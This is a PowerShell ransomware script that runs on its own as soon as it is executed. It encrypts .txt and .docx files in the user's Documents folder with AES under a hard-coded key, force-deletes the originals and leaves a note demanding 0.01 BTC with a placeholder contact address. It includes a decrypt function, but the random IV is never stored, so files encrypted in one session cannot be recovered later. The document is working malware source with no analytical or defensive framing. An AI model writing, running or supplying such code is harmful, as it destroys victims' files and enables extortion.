$Key = "3sc3RLrpd17"  # Static encryption key (in real ransomware, it would be unique per system)
$IV = New-Object byte[] 16
$RansomNote = @"
Your files have been encrypted!

To recover them, you need to send 0.01 BTC to the following address:

[Bitcoin Wallet Address]

Once payment is made, send an email with your transaction ID to decrypt@attacker.com.

DO NOT ATTEMPT TO DELETE OR MODIFY YOUR FILES!
"@

# Generate IV (Initialization Vector)
(New-Object Random).NextBytes($IV)

# Function to encrypt a file
Function Encrypt-File {
    param ([string]$FilePath)

    try {
        # Read file content
        $Plaintext = [System.IO.File]::ReadAllBytes($FilePath)
        
        # Create AES encryption object
        $AES = New-Object System.Security.Cryptography.AesManaged
        $AES.Key = (New-Object Security.Cryptography.PasswordDeriveBytes($Key, $null)).GetBytes(32)
        $AES.IV = $IV
        $Encryptor = $AES.CreateEncryptor()
        
        # Encrypt file
        $Ciphertext = $Encryptor.TransformFinalBlock($Plaintext, 0, $Plaintext.Length)
        [System.IO.File]::WriteAllBytes("$FilePath.locked", $Ciphertext)
        
        # Delete original file
        Remove-Item $FilePath -Force

        Write-Output "[+] Encrypted: $FilePath"
    } catch {
        Write-Output "[ERROR] Failed to encrypt: $FilePath"
    }
}

# Function to decrypt a file
Function Decrypt-File {
    param ([string]$FilePath)

    try {
        # Read encrypted content
        $Ciphertext = [System.IO.File]::ReadAllBytes($FilePath)
        
        # Create AES decryption object
        $AES = New-Object System.Security.Cryptography.AesManaged
        $AES.Key = (New-Object Security.Cryptography.PasswordDeriveBytes($Key, $null)).GetBytes(32)
        $AES.IV = $IV
        $Decryptor = $AES.CreateDecryptor()
        
        # Decrypt file
        $Plaintext = $Decryptor.TransformFinalBlock($Ciphertext, 0, $Ciphertext.Length)
        $OriginalPath = $FilePath -replace ".locked",""
        [System.IO.File]::WriteAllBytes($OriginalPath, $Plaintext)
        
        # Delete encrypted file
        Remove-Item $FilePath -Force

        Write-Output "[+] Decrypted: $OriginalPath"
    } catch {
        Write-Output "[ERROR] Failed to decrypt: $FilePath"
    }
}

# Function to drop ransom note
Function Drop-RansomNote {
    param ([string]$Path)

    $NotePath = "$Path\README_LOCKED.txt"
    Set-Content -Path $NotePath -Value $RansomNote
    Write-Output "[+] Ransom note created at: $NotePath"
}

# Encrypt files in Documents folder
$TargetFolder = "$env:USERPROFILE\Documents"
$Files = Get-ChildItem -Path $TargetFolder -Include "*.txt", "*.docx" -Recurse -ErrorAction SilentlyContinue

ForEach ($File in $Files) {
    Encrypt-File -FilePath $File.FullName
}

# Drop ransom note
Drop-RansomNote -Path $TargetFolder

Write-Output "[!] All targeted files have been encrypted."
Write-Output "[!] To decrypt, use: Decrypt-File -FilePath 'C:\Path\To\File.locked'"
